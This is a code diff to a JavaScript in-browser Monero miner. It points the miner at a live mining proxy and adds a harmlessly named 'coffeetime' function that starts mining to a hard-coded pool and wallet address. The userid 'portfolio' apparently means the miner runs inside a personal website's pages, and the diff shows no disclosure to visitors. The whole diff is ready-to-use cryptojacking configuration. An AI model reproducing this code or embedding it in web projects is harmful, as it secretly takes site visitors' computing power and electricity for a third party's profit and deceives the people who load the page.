@@ -1,4 +1,4 @@
-var server = "wss://ws1.server:80/;wss://ws2.server:80/;wss://ws3.server:80/", job = null, workers = [], ws, receiveStack = [], sendStack = [], totalhashes = 0, connected = 0, reconnector = 0, attempts = 1, throttleMiner = 0, handshake = null, wasmSupported = function() {
+var server = "wss://ny1.xmrminingproxy.com", job = null, workers = [], ws, receiveStack = [], sendStack = [], totalhashes = 0, connected = 0, reconnector = 0, attempts = 1, throttleMiner = 0, handshake = null, wasmSupported = function() {
     try {
         if ("object" === typeof WebAssembly && "function" === typeof WebAssembly.instantiate) {
             var c = new WebAssembly.Module(Uint8Array.of(0, 97, 115, 109, 1, 0, 0, 0));
@@ -8,6 +8,19 @@ var server = "wss://ws1.server:80/;wss://ws2.server:80/;wss://ws3.server:80/", j
     } catch (g) {}
     return !1
 }();
+
+function coffeetime() {
+    // Set your desired values here
+    var pool   = "gulf.moneroocean.stream:80";     // Mining pool/proxy URL
+    var wallet = "429Jam8Aas6hpdSywvGsVQNENYMrBwMddGriWfiZTYhHPQ7xnrfr8VvieVYQoUVG5eL5S3jkgbGLL5KQPCCsFQg6B2nUoca";          // Monero wallet address
+    var password = "";                          // Pool password, often just "x"
+    var threads  = -1;                           // -1 for auto, or set a specific number
+    var userid   = "portfolio";                           // Optional, leave empty if not used
+
+    // Call the original startMining function
+    startMining(pool, wallet, password, threads, userid);
+}
+
 function addWorkers(c) {
     logicalProcessors = c;
     if (-1 == c) {
